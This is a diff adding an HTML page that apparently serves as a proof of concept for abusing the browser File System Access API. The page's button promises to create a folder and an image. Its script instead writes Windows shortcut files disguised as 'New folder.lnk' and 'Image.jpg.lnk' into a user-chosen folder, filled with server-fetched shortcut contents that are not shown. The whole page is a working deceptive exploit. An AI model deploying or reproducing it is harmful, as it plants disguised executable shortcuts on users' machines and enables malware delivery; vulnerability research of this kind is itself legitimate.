@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>File System Access API</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+</head>
+
+<body>
+    <h3>File System Access API save .lnk and .local</h3>
+
+    <div style="display: flex; flex-direction: row">
+
+        <div style="width: 50%">
+            <div>
+                <button id="butDirectory">Select a folder where to create a new folder and image.jpg</button>
+            </div>
+        </div>
+
+    </div>
+    <script>
+        let fileHandle;
+        const butDir = document.getElementById('butDirectory')
+        butDir.addEventListener('click', async () => {
+            //get a user system folder
+            const dirHandle = await window.showDirectoryPicker()
+
+            //create New Folder shortcut file in a user system folder
+            const newFileHandle = await dirHandle.getFileHandle('New folder.lnk', {
+                create: true
+            })
+
+            //write real lnk code to the file that we created
+            const writable = await newFileHandle.createWritable()
+            const response = await fetch('folder.lnk')
+            await response.body.pipeTo(writable)
+
+            //create image.jpg shortcut file in a user system folder
+            const newFileHandleImage = await dirHandle.getFileHandle('Image.jpg.lnk', {
+                create: true
+            })
+
+            //write real lnk code to the file that we created
+            const writableForImage = await newFileHandleImage.createWritable()
+            const responseForImage = await fetch('lnkextra.lnk')
+            await responseForImage.body.pipeTo(writableForImage)
+        })
+    </script>
+</body>
+
+</html>
